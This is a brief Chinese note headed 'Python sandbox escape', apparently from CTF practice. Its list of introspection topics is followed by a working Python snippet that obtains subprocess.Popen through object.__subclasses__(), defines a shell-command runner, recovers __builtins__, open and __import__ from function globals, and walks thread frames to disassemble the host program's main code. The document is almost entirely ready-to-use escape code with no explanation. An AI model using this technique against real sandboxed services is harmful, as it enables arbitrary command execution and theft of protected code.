# Python沙箱逃逸

1. inspect
2. frame
3. dis.dis
4. sys
5. object

```python
popen = object.__subclasses__()[351]
def run_cmd(cmd):
	print(popen(cmd,shell=True,stdout=-1).communicate()[0].decode())

__builtins__ = popen.__init__.__globals__.get('__builtins__')
open = __builtins__.get('open')
__import__ = __builtins__.get('__import__')

sys = __import__('sys')
app_main = sys.modules['__main__']

compile = __builtins__.get('compile')
StringIO = __import__('io').StringIO
dis = __import__('dis')
inspect = __import__('inspect')
threading = __import__('threading')

def print_f_code(f_code):
    i = StringIO()
    dis.dis(f_code, file=i)
    print(i.getvalue())

def get_top_frame(frame):
    while frame.f_back:
        print(frame)
        frame = frame.f_back
    return frame.f_code

main_thread = threading.enumerate()[0]
frame = sys._current_frames().get(main_thread.ident, None)
print(print_f_code(get_top_frame(frame)))
```